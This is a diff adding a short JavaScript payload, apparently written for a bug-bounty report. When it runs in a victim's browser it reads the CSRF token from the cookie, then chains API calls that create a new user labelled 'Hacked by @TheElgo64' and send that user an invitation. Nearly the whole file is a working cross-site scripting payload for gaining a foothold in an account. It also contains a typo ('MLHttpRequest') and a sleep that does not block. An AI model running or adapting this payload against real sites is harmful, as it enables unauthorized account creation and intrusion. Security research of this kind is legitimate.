@@ -1,0 +1,46 @@
+// get the csrf token from the cookie because it's not printed in the html pages
+var csrf = document.cookie.match( /(; )CSRF-Token=([^;]*);?/ )[ 2 ];
+
+
+// get id for new user ===========================================
+
+var req_1 = new MLHttpRequest();
+req_1.open('POST','/api/v2/GetNewId',true);
+req_1.onload = handleResponse;
+req_1.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+req_1.setRequestHeader("Csrf-Token", csrf);
+req_1.send(JSON.stringify({}));
+function handleResponse() {
+    var id = this.responseText.match(/"id":(\w+),/)[1];
+
+// create user =====================================================
+
+    var req_2 = new XMLHttpRequest();
+    req_2.open("POST","/api/v2/NewUser");
+    req_2.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    req_2.setRequestHeader("Csrf-Token", csrf);
+    var randomValue = Math.floor(Math.random() * 9999999999);
+    var email = "theelgo64+" + randomValue + "@wearehackerone.com";
+    req_2.send(JSON.stringify({"userid":parseInt(id),"email":email,"firstname":"Hacked by @TheElgo64","lastname":"00Name"}));
+
+
+// sleep for 2 seconds to bypass some errors =====================
+    const sleep = async (milliseconds) => {
+        await new Promise(resolve => {
+            return setTimeout(resolve, milliseconds)
+            });
+        };
+        const testSleep = async () => {
+            await sleep(2000);
+        }
+        testSleep();
+
+// send invitation  ==============================================
+
+    var req_3 = new XMLHttpRequest();
+    req_3.open("POST","/api/v2/SendInvitation");
+    req_3.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    req_3.setRequestHeader("Csrf-Token", csrf);
+    req_3.send(JSON.stringify({"id":parseInt(id)}));
+    
+};
